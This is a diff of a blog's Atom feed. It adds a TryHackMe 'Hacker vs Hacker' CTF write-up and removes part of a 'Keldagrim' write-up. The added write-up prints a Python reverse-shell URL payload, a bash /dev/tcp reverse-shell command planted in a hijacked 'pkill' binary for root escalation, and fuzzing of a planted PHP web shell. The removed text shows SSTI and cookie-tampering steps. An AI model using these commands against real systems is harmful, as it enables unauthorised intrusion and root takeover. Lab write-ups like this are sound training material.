@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/tag/tryhackme/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2022-08-20T23:33:18+00:00</updated>
+  <updated>2022-08-21T10:52:11+00:00</updated>
   <id>https://darrynbrownfield.co.uk/tag/tryhackme/feed.xml</id>
 
   
@@ -30,6 +30,261 @@
   
   
 
+  
+    <entry>
+      <title type="html">Hacker vs Hacker Write up</title>
+      <link href="https://darrynbrownfield.co.uk/hackervshacker" rel="alternate" type="text/html" title="Hacker vs Hacker Write up" />
+      <published>2022-08-21T00:00:00+00:00</published>
+      <updated>2022-08-21T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/hackervshacker</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/hackervshacker">&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/hackervshacker&quot;&gt;Hacker Vs Hacker&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/Aquinas&quot;&gt;Aquinas&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The description for this room is:&lt;/p&gt;
+
+&lt;p&gt;“The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can’t shut it down (they’d lose SEO!) so maybe you can help?”&lt;/p&gt;
+
+&lt;p&gt;So this is going to be different to typical CTF room!&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and was given the target IP 10.10.212.207. I started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/initial 10.10.212.207
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-08-21 10:32 BST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.212.207
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.076s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: RecruitSec: Industry Leading Infosec Recruitment
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.67 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;2 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - OpenSSH 8.2p1 Ubuntu&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache httpd 2.4.41&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I also ran a full port scan but no additional ports were open.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+&lt;p&gt;Checking out the website on port 80, its very basic but at the bottom is a feature to upload a CV.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I created a file called test.txt just so I could try uploading something. However when I submit the request I get the response:&lt;/p&gt;
+
+&lt;p&gt;“Hacked! If you dont want me to upload my shell, do better at filtering!”&lt;/p&gt;
+
+&lt;p&gt;I looked at the source code of the page to see if provide any further information and found:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/hacked.png&quot; alt=&quot;hacked&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried to upload a .pdf file but got the same response so it doesn’t look like I can upload my own script to create a shell. Looking at the source code, two things jump out. The first is files are uploaded to ‘/cvs/’. Second the script is checking ‘.pdf’ is included in the filename using the function ‘strpos’.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The strpos() function finds the position of the first occurrence of a string inside another string.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If I was the hacker, to bypass this filtering I would have uploaded a file called something like ‘rce.pdf.php’. So I fuzzed the cvs directory for any files with the extensions ‘.pdf.php’.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/opt/SecLists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,403 http://10.10.212.207/cvs/FUZZ.pdf.php
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+
+Target: http://10.10.212.207/cvs/FUZZ.pdf.php
+Total requests: 4661
+
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+ID           Response   Lines    Word       Chars       Payload                                                                                                           
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+
+000003693:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;shell&quot;&lt;/span&gt;                                                                                                           
+
+Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
+Processed Requests: 4661
+Filtered Requests: 4660
+Requests/sec.: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I got a hit! So now to find the parameter used to execute commands, typically its something like ‘cmd’ which it was but if it wasn’t it could be fuzzed.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/opt/SecLists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404,403 http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id                                                  
+                                                     
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;                                                                                                                           
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                                                                                                                           
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;                                                                                                                           
+                                                                                                                                                                                   
+Target: http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id                                                                                                                             
+Total requests: 4661                                                                                                                                                               
+                                                                                                                                                                                   
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;                                                                                                              
+ID           Response   Lines    Word       Chars       Payload                                                                                                                    
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;                                                                                                              
+                                                                                                                                                                                   
+000000001:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.bash_history&quot;&lt;/span&gt;                                                                                                            
+000000003:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.cache&quot;&lt;/span&gt;                                                                                                                   
+000000012:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.htpasswd&quot;&lt;/span&gt;                                                                                                                
+000000014:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.listings&quot;&lt;/span&gt;                                                                                                        
+000000010:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.hta&quot;&lt;/span&gt;                                                                                                             
+000000015:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.mysql_history&quot;&lt;/span&gt;                                                                                                   
+000000016:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.passwd&quot;&lt;/span&gt;                                                                                                          
+000000011:   200        1 L      2 W        18 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;.htaccess&quot;&lt;/span&gt;                                                                                                        &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Everything is returning a 200 response so instead of filtering based on the HTTP response code I changed the filter to be based on the characters in the response.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$wfuzz&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/opt/SecLists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt; 18 http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id
+
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+
+Target: http://10.10.212.207/cvs/shell.pdf.php?FUZZ&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id
+Total requests: 4661
+
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+ID           Response   Lines    Word       Chars       Payload                                                                                                           
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+
+000001100:   200        2 L      5 W        72 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;cmd&quot;&lt;/span&gt;                                                                                                             
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
+Processed Requests: 1779
+Filtered Requests: 1778
+Requests/sec.: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+&lt;p&gt;Now I have command execution, I first tried to get a shell. I started a netcat listener with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Then from the browser, I entered:&lt;/p&gt;
+
+&lt;p&gt;http://10.10.212.207/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22%22,4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22/bin/bash%22)%27&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A great resource for quickly creating reverse shell commands is https://www.revshells.com&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I got a hit back but shortly afterwards the shell died with the message ‘nope’.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$nc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 4444
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
+connect to &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.212.207] 41984
+www-data@b2r:/var/www/html/cvs&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nope&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The hacker was killing my connection (rude!). So instead of getting a shell I used the ‘shell.pdf.php’ script to enumerate the machine. To make this easier and used Burp and send the request to the Repeater tab.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/home.png&quot; alt=&quot;home&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is a single home directory for lachlan. The ‘.bash_history’ is not empty so I checked that first.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/history.png&quot; alt=&quot;history&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It looks like the password was changed, I tried to login as the lachlan user with the password.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ssh&lt;/span&gt; lachlan@10.10.212.207
+lachlan@10.10.212.207&lt;span class=&quot;s1&quot;&gt;'s password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 21 Aug 2022 10:20:11 AM UTC
+
+  System load:  0.58              Processes:             135
+  Usage of /:   25.1% of 9.78GB   Users logged in:       0
+  Memory usage: 26%               IPv4 address for eth0: 10.10.212.207
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sun Aug 21 10:19:58 2022 from 
+$ nope
+Connection to 10.10.212.207 closed.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The same happened as the python shell, I got kicked out.&lt;/p&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+&lt;p&gt;I looked at the persistence cron.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackervshacker/persistence.png&quot; alt=&quot;persistence&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The hacker is first setting the path to ‘/home/lachlan/bin:/bin:/usr/bin’ which means it will check the ‘/home/lachlan/bin’ folder for binaries first. Then the cron is running commands to kill any connections. Most of the commands are using absolute paths however, ‘pkill’ is not. So if I can add a file in ‘/home/lachlan/bin/’ with the name ‘pkill’ that should be executed with the permissions of root.&lt;/p&gt;
+
+&lt;p&gt;The lachlan user owns the bin folder so if I can log in using SSH and execute the commands quickly enough I should be able to create the file before the session is killed.&lt;/p&gt;
+
+&lt;p&gt;I copied the following command to my clipboard:&lt;/p&gt;
+
+&lt;p&gt;echo “/bin/bash -c ‘/bin/bash -i &amp;gt;&amp;amp; /dev/tcp//4444 0&amp;gt;&amp;amp;1’” &amp;gt; /home/lachlan/bin/pkill; chmod +x /home/lachlan/bin/pkill&lt;/p&gt;
+
+&lt;p&gt;I restarted my netcat listener, SSH’d to the machine as lachlan and pasted the command. A second later I got a shell!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$nc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 4444
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
+connect to &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.212.207] 41998
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4040&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+root@b2r:~# &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Thats root!&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+
+&lt;p&gt;==========================================================================&lt;/p&gt;
+
+&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="easy" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Road Write Up</title>
@@ -3135,187 +3390,6 @@ dailybugle
         <category term="hard" />
       
         <category term="oscp" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">Keldagrim Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/keldagrim" rel="alternate" type="text/html" title="Keldagrim Write Up" />
-      <published>2021-03-06T00:00:00+00:00</published>
-      <updated>2021-03-06T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/keldagrim</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/keldagrim">&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cover.png&quot; alt=&quot;keldagrim&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/keldagrim&quot;&gt;Keldagrim&lt;/a&gt; is a medium level CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/optionalctf&quot;&gt;Optional&lt;/a&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Can you overcome the forge and steal all of the gold!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;I deployed the machine and was given the target IP 10.10.252.142 I started a nmap scan to check the available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.252.142
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-06 13:03 GMT
-Nmap scan report for 10.10.252.142
-Host is up (0.030s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)
-|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)
-|_  256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (ED25519)
-80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
-| http-cookie-flags: 
-|   /: 
-|     session: 
-|_      httponly flag not set
-|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
-|_http-title:  Home page 
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Werkzeug httpd 1.0.1&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;I opened up my browser and started to have a look at the web page.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing really stood out however when I looked at the source code I could see a disabled link to /admin&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;    &amp;lt;li class=&quot;nav-item dropdown&quot;&amp;gt;
-        &amp;lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;navbarDropdown&quot; role=&quot;button&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&amp;gt;
-          Buy Gold
-        &amp;lt;/a&amp;gt;
-        &amp;lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;navbarDropdown&quot;&amp;gt;
-            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/wow&quot;&amp;gt;World of Warcraft&amp;lt;/a&amp;gt;
-            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/OSRunescape&quot;&amp;gt;Old School Runescape&amp;lt;/a&amp;gt;
-            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/runescape&quot;&amp;gt;Runescape3&amp;lt;/a&amp;gt;
-          &amp;lt;div class=&quot;dropdown-divider&quot;&amp;gt;&amp;lt;/div&amp;gt;
-          &amp;lt;a class=&quot;dropdown-item &quot; href=&quot;/admin&quot;&amp;gt;Admin&amp;lt;/a&amp;gt;
-        &amp;lt;/div&amp;gt;
-      &amp;lt;/li&amp;gt;
-&amp;lt;/ul&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However the page looks pretty much the same. So I looked at cookies and found a session cooke with a base64 value.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/guest.png&quot; alt=&quot;guest&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;There are lots of ways to change the base64 to plaintext but I really like &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; at the moment. Using CyberChef I was able to see the value was ‘guest’.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cyberchef.png&quot; alt=&quot;cyberchef&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I used CyberChef again to encode ‘admin’ in to base64.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/adminhash.png&quot; alt=&quot;adminhash&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Simply changing the session cookie value to the base64 output and refreshing the page now allowed me to see - ‘Current user - $2,165’ and be provided with a sales cookie.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sales.png&quot; alt=&quot;sales&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This was also base64 encoded, CyberChef has a great feature called ‘Magic’, if you are unsure how something is encoded use magic to suggest and test various operations.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/saleshash.png&quot; alt=&quot;saleshash&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This next bit took some time, I was able to base64 a string and input it in to the sales cookie and it would be displayed on the webpage, however I was unsure how I would be able to use this to get a foothold on the box. After some googling, I tried a technique called Server Side Template Injection (SSTI). This was not something I had tried to exploit before so I did some research on the technique to try and understand it and used &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; to see if I was on the right track.&lt;/p&gt;
-
-&lt;p&gt;I found a payload {{7*'7’}} and if I had SSTI that should result in 7777777. I encoded the payload in base64 and updated the sales cookie with the output.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sstipayload.png&quot; alt=&quot;sstipayload&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Refreshed the page and confirmed I had SSTI in the sales cookie!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/ssti.png&quot; alt=&quot;ssti&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;On the same &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; page was an example for remote code execution. I took the example for exploiting an SSTI by calling Popen without guessing the offset, changed the IP and port values and encoded again with base64.&lt;/p&gt;
-
-&lt;p&gt;I opened a nc listener and updated the sales cookie with the base64 output and got a shell!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [10.8.21.217] from (UNKNOWN) [10.10.252.142] 36928
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-jed
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Now to get root i checked ‘sudo -l’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
-Matching Defaults entries for jed on keldagrim:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
-
-User jed may run the following commands on keldagrim:
-    (ALL : ALL) NOPASSWD: /bin/ps
-&lt;/code&gt;&lt;/pre&gt;
-
